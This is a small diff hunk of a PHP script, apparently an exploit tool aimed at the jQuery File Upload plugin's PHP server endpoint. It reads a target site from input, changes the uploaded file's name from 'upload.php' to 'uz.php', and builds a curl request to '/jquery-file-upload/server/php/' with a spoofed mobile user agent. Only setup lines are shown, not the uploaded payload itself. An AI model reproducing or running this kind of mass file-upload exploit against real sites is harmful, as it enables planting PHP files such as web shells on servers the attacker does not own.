@@ -10,7 +10,7 @@ error_reporting(0);
   $target = trim(fgets(STDIN));
   
   
-$uploadfile="upload.php";
+$uploadfile="uz.php";
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "$target/jquery-file-upload/server/php/");
 curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36');
